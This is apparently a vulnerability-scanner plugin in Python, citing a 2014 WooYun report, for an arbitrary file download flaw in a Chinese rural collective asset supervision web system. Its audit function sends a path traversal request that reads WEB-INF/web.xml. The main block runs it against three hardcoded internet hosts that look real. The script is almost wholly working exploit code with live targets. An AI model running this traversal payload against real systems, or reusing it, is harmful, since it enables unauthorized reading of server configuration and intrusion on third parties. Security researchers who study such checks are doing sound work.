#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:中农信达农村集体三资网络监管系统任意文件下载
#Refer:http://www.wooyun.org/bugs/wooyun-2014-069864

def assign(service,arg):
    if service=="sino_agri_sinda":
        return True,arg 
    
def  audit(arg):
    url=arg+"servlet/downloadfile?filename=/../WEB-INF/web.xml&userid=/"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and '<web-app>' in res and '<servlet-name>' in res:
            security_hole(url)

if __name__=="__main__":
    from dummy import *

    audit(assign('sino_agri_sinda','http://tlnj.vicp.net:11432/finance/')[1])
    audit(assign('sino_agri_sinda','http://221.1.96.9:8083/finance80/')[1])
    audit(assign('sino_agri_sinda','http://219.157.74.6:8080/finance/')[1])